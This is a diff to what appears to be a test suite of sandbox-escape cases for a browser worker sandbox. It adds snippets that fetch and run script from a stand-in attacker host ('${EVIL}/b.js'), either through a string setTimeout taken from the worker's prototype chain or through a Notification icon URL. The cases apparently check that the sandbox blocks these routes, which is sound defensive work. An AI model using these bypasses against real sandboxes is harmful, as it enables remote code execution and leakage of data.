@@ -81,6 +81,16 @@ const ESCAPES = {
   "string-timer": wrap(`
     setTimeout("import('${EVIL}/b.js?via=timer')", 0);
 ${pause}`),
+  // Chrome keeps setTimeout on WorkerGlobalScope.prototype; call it from there with a string.
+  "proto-string-timer": wrap(`
+    const d = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(self), "setTimeout")
+      ?? Object.getOwnPropertyDescriptor(Object.getPrototypeOf(Object.getPrototypeOf(self)), "setTimeout");
+    d.value.call(self, "import('${EVIL}/b.js?via=proto-timer')", 0);
+${pause}`),
+  // Notification must be gone from the worker.
+  "notification": wrap(`
+    new Notification("x", { icon: "${EVIL}/b.png?via=notification" });
+${pause}`),
   // Plain dynamic import (static scan bypassed by calling runInBrowser directly).
   "plain-import": wrap(`
     await import("${EVIL}/b.js?via=plain");`),
